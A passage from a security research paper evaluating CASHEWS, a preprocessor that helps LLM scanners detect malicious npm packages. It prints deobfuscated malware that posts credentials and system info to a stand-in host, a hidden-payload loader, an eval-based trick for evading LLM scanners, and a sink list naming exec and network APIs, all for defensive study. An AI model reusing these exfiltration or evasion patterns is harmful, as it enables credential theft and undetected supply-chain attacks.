+with the LLM-based detectors. First, we consider the Cover-age, i.e., the percentage of files that can be scanned by the detector. Then, we measure the false negative rate (FNR) and false positive rate (FPR). We consider that a file that is not cov-ered is classified as benign and compute the FNR accordingly to remain faithful to deployment concerns, as the number of files to verify manually would otherwise be impractical at the scale of the npm registry. Finally, we compute the token cost using the rates described in Appendix A.1. 
+
+## 6.2 RQ1: Preprocessing and Classification 
+
+In this section, we aim to answer RQ1 and characterize the efficacy of C ASHEWS . We first establish the baseline perfor-mance of the two scanners, then measure the improvement of classification after preprocessing. 8Table 1: Classification and coverage across multiple detector settings on the 512 files larger than 25,000 tokens. Prepro-cessed corresponds to the single-source representation after applying C ASHEWS while Top-3 Fallback corresponds to se-lecting the top 3 units if the file is still too large.                                                                               
+
+> Workflow Model Source FNR FPR Coverage Token Cost ∗
+> (%) (%) (%) Zero-Shot GPT-5 nano Original 36.7 1.2 69.5 $1.63 ($1.63) Preprocessed 27.7 1.2 78.5 $1.53 ($1.17) Top-3 Fallback 21.1 2.9 100.0 $2.50 ($1.17) GPT-5.6 Luna Original 34.9 0.0 69.7 $6.26 ($6.26) Preprocessed 26.5 0.0 78.5 $5.78 ($4.42) Top-3 Fallback 19.3 0.0 100.0 $12.07 ($4.42) DeepSeek V4 Flash Original 34.3 0.0 69.7 $4.67 ($4.67) Preprocessed 24.1 0.3 78.5 $4.34 ($3.32) Top-3 Fallback 15.7 0.9 100.0 $9.34 ($3.32) Multi-Stage GPT-5 nano Original 30.1 1.2 69.1 $8.84 ($8.84) Preprocessed 21.1 1.2 78.5 $9.26 ($7.61) Top-3 Fallback 16.3 2.6 98.8 $12.26 ($7.61) GPT-5.6 Luna Original 28.3 0.9 85.7 $50.37 ($50.37) Preprocessed 22.3 0.9 92.0 $44.05 ($36.19) Top-3 Fallback 20.5 0.9 99.4 $51.46 ($36.19) DeepSeek V4 Flash Original 40.4 0.0 69.1 $14.97 ($14.97) Preprocessed 29.5 0.3 78.5 $14.54 ($11.02) Top-3 Fallback 22.3 0.9 100.0 $21.43 ($11.02)
+> ∗Parentheses give the token cost on files analyzed across all inputs.
+
+Baseline Classification. Table 1 shows the performance of two scanners on the dataset. We remark that the false positive rate (FPR) is consistently low except for GPT-5 nano, con-sistent with the model being of an earlier generation. Under the same threshold, we see that the ordering of false-positive rates is consistent across settings: GPT-5 nano is the most false positive oriented while DeepSeek V4 Flash is the least. On the other hand, 30% of the files cannot be analyzed as is for all but one setting (Multi-Stage with GPT-5.6 Luna). The pipeline for Multi-Stage was originally built around weaker models (GPT-3.5 and GPT-4) that could not classify in a sin-gle call or create a lot of false positives, which justified the design choices (prompting techniques, multi-stage pipeline...) at the time. However, with the recent improvements in model reliability and performance, these design choices are now ves-tigial and drive the cost up, as the zero-shot scanner achieves close to the same performance at 12.4–31.2% of the cost. 
+
+Finding 1. Against zero-shot, the multi-stage workflow lowers the false negative rate for most models (by 6.6 percentage points for GPT-5 nano), but at 3–8 × the cost. 
+
+Applying C ASHEWS . The Preprocessed row of Table 1 shows the result of applying C ASHEWS . We observe that preprocess-ing increases coverage by nearly 10 percentage points and reduces FNR by a similar amount across all settings, thus pre-serving classification. Further, C ASHEWS rarely incurs false positives, with a 0.3 percentage point increase at most. 
+
+Top-3 Units Fallback. The Top-3 Fallback row of Table 1 shows the classification performance when selecting the top three extracted units with the most sources and sinks when the file is still too large after applying C ASHEWS . We observe that through this, coverage reaches 100% except for a few very extreme examples. While this reduces the FNR by improving coverage, it does at the cost of a higher FPR (by up to 1.7 percentage points) and the introduction of false negatives. For large bundles with many modules or extracted payloads, we found that the false negatives came from the top-3 selection of units: the malicious code may be in a unit that contain sinks and sources but is only ranked 4, prompting for future work in improving the selection of units to analyze. 
+
+Takeaway 1. CASHEWS improves LLM-based detection on large files, increasing coverage to 98.8–100% and reducing FNR by up to 18.6 percentage points. 
+
+## 6.3 RQ2: Scalability 
+
+In this section, we answer RQ2 and characterize the scalability of C ASHEWS for registry-wide deployment. 
+
+Time and Reduction. Figure 8 shows that both the median number of tokens saved after applying C ASHEWS and the median preprocessing time increase monotonically with the original token count. Further, we found that the largest 20% of files account for 91.7% of total preprocessing time and 99.1% of total token savings, while files larger than 250,000 tokens account for 64.8% of preprocessing time and 87% of token savings despite representing only 3.3% of the full dataset. 
+
+Finding 2. CASHEWS achieves a median processing time of 30s on files larger than 25,000 tokens and about 3 minutes on the largest files (greater than 250,000). <1k (n=2,844) 1k–10k (n=1,257) 10k–25k (n=270) 25k–100k (n=248) 100k–250k (n=102) >250k (n=162) 
+
+> Original token count
+> 10 2
+> 10 3
+> 10 4
+> 10 5
+> Median tokens saved per case  Tokens saved Preprocessing time 10 0
+> 10 1
+> 10 2
+> Median preprocessing time (s)
+
+Figure 8: Median processing time and absolute tokens saved as a function of the original token count. 9<1k (n=2,844) 1k–10k (n=1,257) 10k–25k (n=270) 25k–100k (n=248) 100k–250k (n=102) >250k (n=162) 
+
+> Original token count
+> 10 −2
+> 10 −1
+> 10 0
+> 10 1
+> 10 2
+> USD per 1,000  fi les
+> Range across models LLM input cost saved (model mean) CASHEWS preprocessing cost
+
+Figure 9: Cost savings vs. preprocessing cost of C ASHEWS at $0.045 per core-hour. The difference grows with larger files and is positive for files with more than 1,000 tokens. 
+
+Model Economics. We selected the three models as they are good options for a classification problem at scale. Yet, they dif-fer in price, context size, and performance. These three charac-teristics form a trade-off that has generally been exploited by model routing [18] (deciding which requests to which LLM). With C ASHEWS , larger files, often the most difficult to ana-lyze, exhibit significant reduction in size, which enables the use of stronger models at virtually no cost. For example, files of packages like lau-ecom-design-system@1.0.18 can go from 200K+ tokens to less than 10K, enabling the use of the more recent and powerful GPT-5.6 Luna at half the cost of GPT-5 nano. We found that to be true for 12.7% of the files. 
+
+Finding 3. Using C ASHEWS , 44.9% of files can be ana-lyzed using GPT-5.6 Luna at a lower cost than DeepSeek V4 Flash. Similarly, 12.7% can be analyzed by GPT-5.6 Luna instead of GPT-5 nano at half the cost. 
+
+Cost of Per-Unit Scanning. When selecting the top three units, the largest files are now scannable. Therefore, the overall token cost increases significantly for the Zero-shot workflow, nearly doubling for GPT-5.6 Luna (from $6.26 to $12.07). Indeed, at worst, each of the three per-unit calls may fill the context window. 
+
+Deployment Economics. Figure 9 shows the token cost saved and C ASHEWS CPU cost as a function of the original file size given a cost of $0.045 per core-hour. Files below 1,000 tokens are the only ones where C ASHEWS ’s cost slightly outweighs the gains in token cost. For larger files, C ASHEWS token reduction pays for itself, even for files between 1,000 and 25,000 tokens. C ASHEWS reduces modeled input-token cost by 36.6% and by 34.6% if considering preprocessing cost. 
+
+Takeaway 2. CASHEWS allows scalable LLM-based analysis of the npm registry, with a median preprocessing time of 30s and a net cost saving of 34.6% on large files. 
+
+## 6.4 RQ3: Ablation Study 
+
+To conclude the evaluation, we answer RQ3 and discuss the importance of each of the four steps. All steps of the frame-work contribute to an overall reduction in token count, but they do so with different assumptions on the code. The slic-ing step assumes non-obfuscated code and thus depends on the performance of the decoding loop. Likewise, source ab-breviation reduces tokens regardless of obfuscation, but may achieve that reduction at the cost of hiding behavior. Table 2: Files, token reduction, and time of each step.                                      
+
+> Step Files Reduction Time (s) P50 P90 P95 P50 P90 P95 Decode 456 (89.1%) 0.3% 7.3% 19.8% 17.8 261.3 322.2 Extraction ∗244 (47.7%) 43.3% 98.9% 99.7% –––Slice 140 (27.3%) 0.6% 23.4% 43.4% 8.5 21.6 30.1 Abbreviate 470 (91.8%) 19.3% 75.7% 89.3% 0.6 5.2 7.9
+> ∗Reduction measures the share removed by top-3 unit selection. Extraction time is not reported because the step does not modify the source.
+
+Different Regimes. Table 2 reports the percentage of files, re-duction in tokens, and processing time of each step. From this table, we observe two main patterns. The decoding loop ex-hibits lower reduction and higher processing time, but serves as an upfront cost for the later steps. Then, the last step (source abbreviation) achieves the second-highest reduction while re-maining the cheapest to run. 
+
+Finding 4. CASHEWS ’s steps cover different needs. De-coding does not reduce tokens the most, but unlocks sub-sequent steps like extraction, and slicing. 
+
+Decoding Loop. The example from Listing 7 shows how the decoding loop (and specifically the string array decoding) accomplishes the goal of C ASHEWS . The original file (from the full dataset), made of more than 8,000 tokens, contains a rotated string table with several hex identifiers. After the string array resolution as shown in Listing 7, the behavior is significantly clearer, which led to the conversion of a false negative to a true positive (with the multi-stage on DeepSeek V4 Flash). The explanation changes from “likely a legitimate commercial library for Google Ads [...] heavy obfuscation hin-ders auditability but does not indicate clear malicious intent” to “exhibits malicious behavior through the validateLicense function, which exfiltrates system information and license credentials to a hardcoded, non-standard webhook URL.” 
+
+Extraction. As observed, the selection of the top three units enables the highest coverage gain for detection. Indeed, among the 244 files with identified units, 61 were too large to be analyzed by at least one scanner. This can also be seen in Table 2 where the p90 reduction reaches 98.9%. Further, for the 244 files, the step identified an average of 5.4 payloads 10 1 /* Before */  
+
+> 2
+
+const a19_0x50ac0d=a19_0x4293;  
+
+> 3
+
+// ... 200+ lines of a19_0x4293(0x199,'Okb^'), 
+
+,→ a19_0x50ac0d(0x15e,'l&pS') etc.  
+
+> 4
+
+const _0x65199f=_0x2d8564['tZbdK'](getSystemInfo),  
+
+> 5
+
+_0x83ca2b=_0x2d8564[_0x3545ff(0x15e,'l&pS')];  
+
+> 6
+
+// ...  
+
+> 7
+
+_0x1b68eb= await _0x2d60da[_0x3545ff(0x14e,'Hs]9')][ 
+
+,→ _0x3545ff(0x18a,'*1p%')](...)  
+
+> 89
+
+/* After */  
+
+> 10
+
+const systemInfo = getSystemInfo();  
+
+> 11
+
+const url = "https://evil.com";  
+
+> 12
+
+await helpers.request({  
+
+> 13
+
+method: "POST", url: url,  
+
+> 14
+
+body: { chaveAion: credentials["licenseKey"], node: " 
+
+,→ google-ads",  
+
+> 15
+
+resource: resource, operation: operation, 
+
+,→ systemInfo: systemInfo },  
+
+> 16
+
+json: true  
+
+> 17
+
+}); 
+
+Listing 7: Result of decoding on a snippet of n8n-nodes-gg-udhasudsh-hgjkhg-official@0.0.15, with the URL replaced. per file (median 1, P75 2, P90 9, maximum 64) and 83.0 mod-ules per file (median 1, P75 54, P90 209, maximum 2,840). Figure 10 shows the distribution of unit sizes per type, for all (solid) and selected (dashed) units. We see that most units are below 1MB (about 250,000 tokens) with a median of about 1KB (about 250 tokens). Thus, nearly all units comfortably fit in context windows. Further, we observed that 36.2% of code units do not contain any of the supported sinks. 10 B 100 B 1 KiB 10 KiB 100 KiB 1 MiB 10 MiB 
+
+> Extracted unit size
+> 0.0 0.2 0.4 0.6 0.8 1.0
+> Empirical CDF
+> Payloads (1,307) Modules (20,253) AST segments (944) Selected (142) Selected (290) Selected (363)
+
+Figure 10: Distribution of units size. Dashed lines represent the 3 units with the most sources and sinks for each file. 
+
+Finding 5. Extraction provides the largest coverage gain for files containing bundles or embedded payloads. Se-lecting the top three units reduces the tokens passed to the scanner by 98.9% at P90 (43.3% median). 
+
+Slice and Guards. As shown in Table 2, the slice step is skipped for about 72.7% of large files (66% of all files). Ta-ble 3 reports the slice-guards activations (i.e., the number of Table 3: Slice guards activation by label on the full dataset (N=4,884) and the 25,000-token subset (N=512). Each entry reports the number of files, split into benign and malicious. 
+
+Guard Full Dataset (4,884) >25,000 Subset (512) Incomplete module res. 1,921 (1,315/606) 75 (13/62) No supported sinks 734 (609/125) 44 (38/6) Complexity limit exceeded 240 (177/63) 239 (176/63) Reachable dynamic evaluation 233 (28/205) 32 (9/23) Sensitive-source flow 89 (22/67) 12 (10/2) 
+
+files in which one of the guard was triggered) on the full 4,884 files (including files below 25,000 tokens). In most cases, in-complete module resolution and the absence of sinks are the main reasons the slice step is skipped. However, for large files above 25,000, we see that the vast majority of guards triggered come from the complexity bound (i.e., when the AST is too large or too deep to analyze safely). While the full dataset is balanced, we observe a class imbalance on files that trigger guards. For example, the absence of modeled sinks occurs more often in benign files (609 against 125) while dynamic evaluation is largely shown in malicious files. These results echo the prior rule-based detection approaches that have used similar signals as features [11]. 
+
+Finding 6. Some slice guards activations correlate with labels. The lack of any modeled sink is 4.9 × more fre-quent in benign files, while reachable dynamic evaluation is 7.3 × more frequent in malicious ones. 
+
+Loop Failures and Abbreviation. The decoding loop may sometimes fail either because it times out or it does not support a certain obfuscation technique. In the example of Listing 8, a hidden payload c is executed. As it is a compressed Base64-encoded payload, Base64 decoding alone does not reveal the JavaScript code. Therefore, the decoding loop skips it and the payload is abbreviated for the classification. This notably drives the malicious score of DeepSeek V4 Flash from 0.3 to 0.9 as it removes the Base64-encoded content.  
+
+> 1
+
+let c = "eJztPY2f2jaW/wo4U7CD8Qxpu79bwL...[11972 chars 
+
+,→ elided]...05lY01jHJT0GB+McElbEX6fxWTzQU=";  
+
+> 2
+
+if (c = function (c) { ... Buffer.from(c, "base64"); let 
+
+,→ o = e.inflateSync(compressed); ... }(c), !c)  
+
+> 3
+
+return void console.error(o, "failed to decompress");  
+
+> 4
+
+const n = function () { /* require-from-string v2.0.2 */ 
+
+,→ }();  
+
+> 5
+
+module.exports = n(c, o); 
+
+Listing 8: Result of literal abbreviation on regve@1.0.0 
+
+Takeaway 3. Decoding, extraction, slicing, and source abbreviation activate on 89.1%, 47.7%, 27.3%, and 91.8% of files, respectively. 11 7 Discussion 
+
+In this section, we discuss the limitations of C ASHEWS 
+
+against adaptive attacks, as well as deployment challenges for ecosystem-wide analysis of packages. 
+
+## 7.1 Adaptive Attacks on C ASHEWS 
+
+Under our threat model, C ASHEWS can be attacked by ad-versaries. We discuss in this section two classes of adaptive attacks and possible mitigations. We first focus on attacks that aim to create files that would make C ASHEWS take an imprac-tical amount of resources to exhaust the machine that performs the preprocessing, leading to a denial-of-service on the detec-tion pipeline and breaking G2 (bounded processing). Then, we focus on attacks that aim to create files where C ASHEWS 
+
+removes the malicious code, thus evading the LLM-based detector and breaking G1. An adversary may try to create a package file that makes the preprocessing computationally expensive. Indeed, the de-coding loop, bundled unit extraction, and source abbrevia-tion steps query the parsed tree-sitter AST, which can be-come expensive when the AST has too many nodes or is too deep. Similarly, the slicing step may be exploited by creating an artificially large PDG. To mitigate those, every step of CASHEWS is explicitly bounded on time, memory, and output size (as summarized in Appendix C.1). In particular, sandbox decoders are capped per file, request, and sourced accessor invocation, while the slicing step is gated by the bounds on the number of code units, the AST node count and depth. Ex-ceeding such bounds degrades the step’s output or causes the step to be skipped rather than failing the whole preprocessing. At worst, an adversary can force preprocessing to consume the full resource budget allowed by the bounds. 
+
+Processing Evasion. CASHEWS favors retaining code to avoid removing any malicious signal (G1). Yet adaptive ad-versaries may still be able to craft payloads so malicious code is filtered after one of the steps. For decoding and extrac-tion, the adversary can at worst keep the source large, since decoders target specific transformations and extraction does not remove code. As for slicing, the slicing safeguards al-low C ASHEWS to keep the malicious code across multiple failure modes, but it is possible for an adversary with knowl-edge of the system to create a file with a malicious payload that does not use any of the supported sinks and benign code that uses one of the supported sinks, resulting in the back-ward slice selecting the benign code. Beyond expanding the set of supported sinks or adding safeguards to the slicing step of C ASHEWS , more conservative and precise reacha-bility techniques can be considered to improve selection of malicious behaviors. This would come at the cost of more analysis time, which is acceptable given the current timing results of the slicing step. Finally, source abbreviation may be evaded with a carefully crafted literal that contains a mali-cious payload which is dynamically extracted. For example, in the snippet const s = "DECOY«<malicious()»>DECOY"; eval(s.match(/«<(.*?)»>/s)[1]) , malicious() is exe-cuted, but the abbreviation may remove the middle part of s,leaving the surrounding decoy text and degrading the classifi-cation. To address this, the abbreviation step could add rules to detect what may contain JavaScript. However, this comes at the cost of expanding the attack surface for the adversary to increase token cost and include prompt injections. 
+
+## 7.2 Deployment 
+
+We discuss in this section several considerations for deploying CASHEWS on an ecosystem like npm. We first discuss the evolution of the ecosystem and how C ASHEWS would need to adapt. Then, we focus on the tasks that C ASHEWS might be helpful in beyond the detection of malicious packages. 
+
+Evolving Ecosystems. Ecosystems like npm are constantly evolving. Indeed, new bundling frameworks or JavaScript fea-tures may be introduced, and adversaries may create or use new obfuscation strategies. Therefore, the results obtained by the current implementation of C ASHEWS now may not generalize to future packages. We built C ASHEWS with those considerations in mind by making it flexible and extensible. Indeed, adding new decoder transforms, new extraction pat-terns, new sinks, or new rules for the abbreviation step is straightforward. Further, future work may consider adding new steps to C ASHEWS , e.g., to ingest entire package directo-ries instead of a single file. 
+
+Beyond Detection. Beyond strict detection, LLM-based de-tectors can be helpful to understand what a given malicious file does. For instance, the final stage of the multi-stage work-flow includes an output verdict that indicates the behavior of the code. For malicious obfuscated source files, such detec-tors do not need this information to classify. Indeed, there is a large difference between asking whether a given source code is malicious or benign and asking what it does. Let us consider the obfuscated example from Section 3 ( ai-sdk-ollama ). If the goal is to classify the package, then it would be sufficient to only run the long literal abbreviation, leading to a true positive as the scanner would see the apparent obfuscation as malicious. However, to ground the verdict in the behavior of the code (e.g., to identify indicators of compromise), the decoding loop is necessary. To conclude, C ASHEWS could be used beyond LLM-based detection, but it should be tuned to the consumers of its output, whether they are LLM-based detectors or human reviewers (e.g., threat analysis). 
+
+## 8 Related Work 
+
+Prior systems have used static pre-screening and program slicing to reduce malicious-package code before learned or LLM-based classification. However, these techniques are gen-12 Table 4: Capabilities of C ASHEWS compared with prior JavaScript deobfuscation, debundling, and LLM-oriented code-reduction systems. ✓: supported, ●: partial support, ✗: not supported.                                                             
+
+> CASHEWS
+> (Ours) JSIMPLIFIER [45] webcrack [14] D-BUNDLR [41] MalTotal [43] Nguyen et al. [24]
+> Iterative deobfuscation ✓✓✓✗✗✗
+> Sandboxed or dynamic processing ✓✓✓●✗✗
+> Unit extraction (modules) ✓✗✓✓✗✗
+> Unit extraction (payloads) ✓●●✗✗✗
+> Program-dependence representation ✓✗✗✗✓✓
+> Sink-directed dependence slicing ✓✗✗✗✓✓
+> Interprocedural or cross-unit traversal ✓✗✗✗✓●
+> Identifier abbreviation or mangling ✓✗●✗✗✗
+> Type-aware literal abbreviation ✓✗✗✗✗✗
+> Caps individual lexical payloads ✓✗✗✗✗✗
+
+erally embedded in particular detectors and assume that a useful source-, sink-, or behavior-rooted slice can be con-structed. We focus on a detector-agnostic preprocessor that composes iterative deobfuscation, payload and module extrac-tion, conservative slicing, and literal and lexical compaction, while retaining the original input whenever safe reduction cannot be established. We detail below prior work, of which an overview is shown in Table 4. 
+
+Slicing. Prior work has leveraged slicing for security analy-sis of software: MalWuKong [20] and OCS-BERT [38] use security-directed slices as representations for malicious pack-age classifiers. More directly, Nguyen et al. [24] construct a Joern code property graph and use a source–sink taxonomy to reduce npm packages before LLM classification, while Mal-Total [43] combines sink-directed backward slicing with data, control, and bounded call-chain dependencies. Both works report very high token reduction (e.g., 93.7% median input token reduction [24]), but they do not tackle obfuscated sam-ples and continue to require long processing times. C ASHEWS 
+
+is designed to process npm packages at scale, including ob-fuscated packages. Thus, it uses slicing techniques after the decoding loop to deal with such cases. 
+
+Deobfuscation and Debundling. JavaScript deobfuscators reverse transformations such as encoded string arrays, indirect property accesses, dead-code injection, and control-flow flat-tening. REstringer [13] and webcrack [14] implement static and sandbox-assisted rewrites for common obfuscators, with webcrack additionally extracting modules from recognized Webpack and Browserify bundles. JSIMPLIFIER [45] com-bines fault-tolerant preprocessing, AST-based analysis, con-trolled execution, and LLM-assisted identifier renaming to support a broader set of obfuscation techniques. Bundling poses a related obstacle by replacing explicit module struc-ture with generated loaders and wrappers. D-BUNDLR [41] uses domain-specific transformations, learned library identi-fication, and dynamic validation to recover components and library implementations for downstream static analyzers such as CodeQL. These systems principally produce readable code or restore information required by conventional program anal-ysis. In contrast, C ASHEWS exposes embedded programs and bundle modules as independently selectable LLM inputs, and bounds expensive processing so that recovery remains practi-cal before registry-scale LLM inference. 
+
+Context Reduction for LLMs. Recent work has studied code reduction specifically for LLM consumption. Wyss et al. [40] normalize JavaScript and remove code shared with a previous package version to build a package diff for the LLM, while Hrubec and Cito [10] remove lexical elements and shorten identifiers for repository-level software-engineering agents. CASHEWS compacts identifiers and abbreviates literals to mitigate prompt-injection risk and excessive token counts. 
+
+## 9 Conclusion 
+
+In this paper, we introduced C ASHEWS , a JavaScript source preprocessor that reduces the size of a package file to enable LLM-based detection through four steps: decoding, bundled units extraction, code slicing, and source abbreviation. We showed that C ASHEWS significantly improves the coverage of LLM-based detectors and thus their scalability to the npm registry when adversaries exploit the current context window limits of LLM-based detectors. 
+
+## Acknowledgments 
+
+We are grateful to Socket technical staff for labeling the pack-ages in our dataset, for helping us integrate C ASHEWS with their scanner, and for their thoughtful feedback along the way. This work was supported by Socket, Inc. 13 Zero-Shot Prompt 
+
+Rate how malicious the following JavaScript source code is. Respond ONLY with this JSON object (no markdown fences, no commentary): {"maliciousness": <number 0-1>, "confidence": <number 0-1> }Score definitions (all floats in [0, 1]): - maliciousness: how malicious the code is (0 = clearly benign, 1 = clearly malware). - confidence: how sure you are of that maliciousness rating. Figure 11: Prompt used for the zero-shot LLM detector. 
+
+## A Experimental Setup Details A.1 LLM Costs 
+
+Table 5 shows the input and output tokens costs of the LLMs considered at the time of evaluation. This table does not ac-count for the pricing at higher contexts for GPT-5.6 Luna. Model $/M Input $/M Output GPT-5 nano 0.05 0.40 GPT-5.6 Luna 0.20 1.20 DeepSeek V4 Flash 0.14 0.28 Table 5: Costs of the models at the time of evaluation from the provider used (OpenAI and Fireworks). 
+
+## A.2 Zero-Shot Prompt 
+
+Figure 11 shows the prompt for the zero-shot LLM-based detector. 
+
+## B Additional Results 
+
+In this section, we present additional results on the full dataset, including files under 25,000 tokens. 
+
+## B.1 Full Dataset Results 
+
+Table 6 shows the classification results for the entire dataset of 4,884 package files with the same threshold τ = 0.5. We note that the FNR increases in some cases, in particular with GPT-5.6 Luna as it increases by 0.7 percentage points for the Zero-Shot workflow and by 3.6 percentage points for the Multi-Stage workflow. Those results reinforce the findings from Section 6.3, i.e., that C ASHEWS is primarily designed for large files and deploying it on all package files would impact negatively both cost and classification. Table 6: Detection on the full dataset (N = 4,884) at τ = 0.5. Preprocessed corresponds to the single-source representation after applying C ASHEWS while Top-3 Fallback corresponds to selecting the top 3 units for if the file is still too large.                                                                             
+
+> Workflow Model Source FNR FPR Coverage Token Cost ∗
+> (%) (%) (%) Zero-Shot GPT-5 nano Original 7.2 0.5 96.8 $3.34 ($3.34) Preprocessed 6.8 0.7 97.7 $3.09 ($2.74) Top-3 Fallback 6.4 0.9 99.9 $4.07 ($2.74) GPT-5.6 Luna Original 7.3 0.0 96.8 $8.73 ($8.73) Preprocessed 8.5 0.1 97.7 $7.74 ($6.38) Top-3 Fallback 8.0 0.1 99.9 $14.03 ($6.38) DeepSeek V4 Flash Original 11.5 0.0 96.8 $6.62 ($6.62) Preprocessed 11.3 0.0 97.7 $5.89 ($4.87) Top-3 Fallback 10.8 0.1 99.9 $10.89 ($4.87) Multi-Stage GPT-5 nano Original 10.5 0.3 96.7 $57.67 ($57.65) Preprocessed 14.4 0.5 97.7 $57.84 ($56.19) Top-3 Fallback 14.1 0.7 99.8 $60.84 ($56.19) GPT-5.6 Luna Original 9.5 0.1 98.5 $100.66 ($100.65) Preprocessed 13.2 0.1 99.1 $92.60 ($84.74) Top-3 Fallback 13.1 0.1 99.9 $100.01 ($84.74) DeepSeek V4 Flash Original 10.6 0.0 96.7 $31.65 ($31.65) Preprocessed 10.5 0.0 97.7 $30.00 ($26.48) Top-3 Fallback 10.0 0.1 99.9 $36.88 ($26.48)
+> ∗Parentheses give the token cost on files analyzed across all inputs.
+
+## B.2 Sensitivity Analysis 
+
+We report a threshold-sensitivity analysis in Table 7. For each threshold, we compare paired verdicts on the same model–file inputs before and after preprocessing. We define the combined net change as the number of corrected verdicts (FN →TP and FP →TN) minus the number of regressions (TP →FN and TN →FP). Among the evaluated thresholds, τ = 0.5 produces the largest combined net improvement for both workflows: +8 model–file pairs for Zero-Shot and +2 for Multi-Stage. We therefore use τ = 0.5 as our operating threshold. 
+
+## C CASHEWS Implementation Details C.1 Enforced Bounds 
+
+Table 8 shows the implemented bounds for each step. 
+
+## C.2 Decoding Transformations 
+
+Table 9 lists the JavaScript transformations used by the de-coding step, alongside their priority. 14 Table 7: Sensitivity analysis of the two workflows across multiple thresholds τ.
+
+Workflow τ FN →TP TP →FN Net TN →FP FP →TN Net Zero-Shot 0.2 18 17 +1 12 9 -3 0.5 27 18 +9 4 3 -1 0.8 32 31 +1 0 0 +0 Multi-Stage 0.2 14 12 +2 20 9 -11 0.5 16 13 +3 3 2 -1 0.8 10 27 -17 1 0 -1 
+
+Table 8: Bounds enforced by each C ASHEWS stage. Exceed-ing a bound degrades the affected stage and leaves the corre-sponding source unchanged, rather than failing the file. 
+
+Stage Bound Value Decoding loop Rounds ( maxLayers ) 20 Decompression output 8 MiB Sandbox Requests per file 8Request timeout 10 s Preamble execution 5 s Accessor invocation 600 ms Preamble size 256 KiB Unique accessor calls 2,000 V8 heap 64 MiB Response size 10 MiB Units Extraction Max depth 5Max payloads per file 64 Max total payloads 512 AST segment budget 65,536 AST descent depth 4Slicing Code units 256 AST nodes 750,000 AST depth 2,000 
+
+## C.3 Taxonomy of Sinks 
+
+Table 10 shows the taxonomy of sinks used for the back-ward slice (detailed in Figure 6) and for the unit selections (explained in Section 5.2). 
+
+## C.4 Taxonomy of Sources 
+
+Table 11 reports the taxonomy of sources used for some slice safeguards (described in Section 4.4.1 and evaluated in Ta-ble 3) and for the unit selections (explained in Section 5.2). 
+
+## References 
+
+[1] Atinderpal Singh. Shai-Hulud: Mi-asma, Hades, & AI Scanner Evasion. https://www.zscaler.com/blogs/security-research/shai-Table 9: Transformations supported by the decoding step. Lower numbers run first. 
+
+Name Transformation Priority 
+
+resolve-strin g-array 
+
+Finds text hidden in a shuffled list and writes it directly into the code. 0
+
+fold-constant -expressions 
+
+Works out expressions whose result is already known, such as joining fixed strings. 1
+
+split-sequenc e-statement 
+
+Splits a function call and an export written together into separate statements. 1
+
+inline-const-bindings 
+
+Replaces an unchanging name with the simple value assigned to it. 2
+
+decode-escape d-member-acce ss 
+
+Turns escaped names, such as 
+
+\x6c\x6f\x67 , into readable names. 3
+
+decode-rot-ch arcode-eval 
+
+Turns shifted letters and character numbers back into code before JavaScript runs it. 4
+
+resolve-regis tered-global-calls 
+
+Replaces calls made through 
+
+globalThis , window , self , or 
+
+global with direct calls. 6
+
+decrypt-aes-l iteral 
+
+Decrypts AES-protected text when everything needed to unlock it is written in the file. 7
+
+decode-encode d-literal 
+
+Converts Base64 or hexadecimal text back into JavaScript when it contains valid code. 8
+
+hulud-campaign-evolution-miasma-hades-and-ai-scanner-evasion. [2] Atinderpal Singh. Shai-Hulud V2: Npm Supply Chain Attack Analysis. https://www.zscaler.com/blogs/security-research/shai-hulud-v2-poses-risk-npm-supply-chain. [3] Shir Bernstein, David Beste, Daniel Ayzenshteyn, Lea Schonherr, and Yisroel Mirsky. Trust Me, I Know This Function: Hijacking LLM Static Analysis using Bias. In 
+
+Proceedings 2026 Network and Distributed System Se-curity Symposium , San Diego, CA, USA, 2026. Internet Society. doi:10.14722/ndss.2026.242066 .[4] Guoqiang Chen, Xin Jin, and Zhiqiang Lin. Js-DeObsBench: Measuring and Benchmarking LLMs for JavaScript Deobfuscation. In Proceedings of the 2025 ACM SIGSAC Conference on Computer and Commu-nications Security , CCS ’25, pages 36–50, New York, NY, USA, November 2025. Association for Computing Machinery. doi:10.1145/3719027.3744871 .[5] Jonathan Evans. A year of open source vulnerability trends: CVEs, advisories, and malware, March 2026. 15 Table 10: Taxonomy of sinks for the backward slice. Unqualified names denote method-name matches on supported HTTP, chat, and remote-shell clients. 
+
+Category APIs Dynamic eval() , Function() / new Function() , dynamic require( x) and import( x), setTimeout( s) / setInterval( s) with string code, process.dlopen() , process.binding() , vm.runInNewContext() , vm.runInThisContext() , vm.runInContext() ,
+
+vm.compileFunction() , WebAssembly.instantiate() , instantiateStreaming() , compile() , compileStreaming() ,
+
+importScripts() 
+
+Exec child_process.exec() , execSync , execFile , execFileSync , spawn , spawnSync , fork , Bun.$‘cmd‘ , Bun.spawn() ,
+
+Bun.spawnSync() , new Deno.Command() , Deno.run() 
+
+Fs writeFile , writeFileSync , appendFile , appendFileSync , createWriteStream , unlink , unlinkSync , rename ,
+
+renameSync , chmod , chmodSync , mkdir , mkdirSync , rm , rmSync , rmdir , rmdirSync , copyFile , copyFileSync , cp , cpSync ,
+
+symlink , symlinkSync , truncate , truncateSync , chown , chownSync , readFile , readFileSync , createReadStream ,
+
+readdir , readdirSync , readlink , readlinkSync , open , openSync , write , writeSync , writev , writevSync , ftruncate ,
+
+ftruncateSync , fchmod , fchmodSync , Bun.write() , Deno.writeFile() , Deno.writeFileSync() ,
+
+Deno.writeTextFile() , Deno.writeTextFileSync() , Deno.remove() , Deno.removeSync() 
+
+Net request , http.get() , https.get() , connect , net.connect() , createConnection , createServer , fetch() ,
+
+sendBeacon() , new XMLHttpRequest() , new EventSource() , resolve , lookup , resolve4 , resolve6 , resolveTxt ,
+
+resolveMx , resolveCname , resolveSrv , resolveNs , resolveAny , reverse , new WebSocket() , new WebSocketServer() ,
+
+createSocket() , HTTP-client post , put , patch , get , delete , head , options , req , fetch , mail createTransport ,
+
+sendMail , sendEmail , send , chat send , sendMessage , postMessage , sendDocument , editMessage , remote-shell connect ,
+
+exec , shell , sftp , put , uploadFrom , fastPut , access 
+
+Crypto createDecipheriv , createCipheriv , pbkdf2 , pbkdf2Sync , createHash , createHmac , createSign , createVerify ,
+
+generateKeyPair , generateKeyPairSync , randomBytes , scrypt , scryptSync , createPrivateKey , encrypt , decrypt ,
+
+sign , verify 
+
+Browser document.cookie , localStorage , sessionStorage , setItem() , getItem() , removeItem() , clear() ,
+
+document.createElement() , innerHTML , outerHTML , insertAdjacentHTML() , document.write() , document.writeln() ,
+
+location.href , location.assign() , location.replace() 
+
+Table 11: Taxonomy of sources 
+
